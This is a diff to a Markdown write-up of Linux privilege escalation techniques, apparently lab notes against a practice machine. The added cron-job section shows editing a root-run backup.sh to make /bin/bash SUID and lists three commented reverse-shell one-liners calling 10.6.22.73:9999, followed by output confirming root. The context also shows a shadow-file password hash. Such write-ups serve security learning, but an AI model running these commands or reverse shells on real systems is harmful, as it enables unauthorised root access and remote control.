@@ -476,7 +476,7 @@ lxd:!:18796::::::
 karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::
 ```
 
-## Capabilities
+## [Capabilities]()
 
 In Linux, **capabilities** are fine-grained permissions that allow executables to perform specific privileged actions without full root access. They provide a way to delegate certain privileges to non-root processes.
 
@@ -513,7 +513,7 @@ In this case `vim` can be exploited to gain escalated privilege
 ![](Pasted%20image%2020241127151334.png)
 ![](Pasted%20image%2020241127151354.png)
 
-## Cron Jobs
+## [Cron Jobs]()
 
 Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.
 
@@ -557,4 +557,31 @@ $ ls -l /home/karen/backup.sh
 
 -rw-r--r-- 1 karen karen 77 Jun 20  2021 /home/karen/backup.sh
 ```
+
+Giving backup.sh executable permission as we are karen user. After that I updated backup.sh to give `/bin/bash` SUID permission which allow us to run it as root user. (checkout commented code as well for remote shell access possibility)
+
+```
+$ chmod +x backup.sh
+$ cat backup.sh
+#!/bin/bash
+
+chmod u+s /bin/bash
+#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.6.22.73 9999 >/tmp/f
+#bash -i >& /dev/tcp/10.6.22.73/9999 0>&1
+#nc 10.6.22.73 9999 -e bash
+
+```
+
+After a minute, `backup.sh` file has been executed and we are root.
+
+```
+$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
+$ bash -p
+bash-5.0# id
+uid=1001(karen) gid=1001(karen) euid=0(root) groups=1001(karen)
+```
+## [PATH]()
+
+`PATH` is the environmental variable. If a folder for which user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executable.
 
